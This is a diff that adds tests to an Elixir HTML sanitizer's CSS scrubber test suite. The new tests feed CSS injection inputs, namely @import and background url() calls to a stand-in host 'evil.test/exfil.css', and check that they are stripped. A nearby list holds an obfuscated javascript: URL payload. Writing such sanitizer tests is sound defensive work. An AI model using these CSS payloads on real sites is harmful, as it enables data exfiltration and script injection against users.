@@ -79,6 +79,21 @@ defmodule HtmlSanitizeExScrubberCSSTest do
     end)
   end
 
+  test "should NOT return invalid css / url() for @import" do
+    input = ~s|@import url(//evil.test/exfil.css);|
+    assert "" == scrub_css(input)
+
+    input = ~s|.comment { @import url(//evil.test/exfil.css) }|
+    expected = ~s|.comment { }|
+    assert expected == scrub_css(input)
+  end
+
+  test "should NOT return invalid css / url() for background" do
+    input = ~s|.comment { background: url(//evil.test/exfil.css) }|
+    expected = ~s|.comment { background:  |
+    assert expected == scrub_css(input)
+  end
+
   @evil_css_background [
     # \uxxrl unicode
     "background:\\75rl('javascript:alert(\"\\75rl\")');",
